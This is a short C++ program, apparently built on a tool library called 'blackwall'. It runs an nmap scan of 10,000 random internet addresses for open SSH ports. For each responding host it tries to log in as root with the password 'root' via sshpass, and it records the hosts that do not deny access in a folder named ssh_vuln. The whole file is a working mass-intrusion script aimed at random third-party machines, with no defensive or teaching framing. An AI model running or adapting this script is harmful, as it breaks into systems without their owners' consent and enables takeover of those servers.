#include <blackwall/nmap/nmap.hpp>
#include <utils/vector.hpp>
#include <utils/files.hpp>

int main(){
    bw::nmap::Nmap scaner;

    scaner.option( bw::nmap::NORMAL    );
    scaner.option( bw::nmap::PROBE     );
    scaner.option( bw::nmap::AGGRESIVE );
    scaner.option( bw::nmap::SPEED_4   );

    scaner.option( bw::nmap::TARGET_RANDOM );
    scaner.option( bw::nmap::ONLY_OPEN     );
    
    std::string out = scaner.scan(
        "",
        "./dev/results/random_10000_scan",
        10000,
        {22}
    );

    std::cout << out << std::endl;

    auto lines = utils::vec::stripsplit(
        out,// utils::fls::getFile("./dev/results/random_1000_scan"),
        '\n'
    );

    for (auto &line: lines){
        if (utils::str::count(line, '(') != 0 && utils::str::count(line, "report") != 0){
            auto start = line.find('(');
            auto end = line.find(')');
            auto target_ip = line.substr(start + 1, end - start - 1);
            
            std::cout << target_ip << std::endl;
            std::string out = bw::sys::execute("sshpass -p root ssh root@" + target_ip);
            std::cout << out << std::endl;

            if (utils::str::count(out, "denied") == 0)
                utils::fls::writeFile("./dev/ssh_vuln/root_" + target_ip + ".msg", out);
        }
    }
}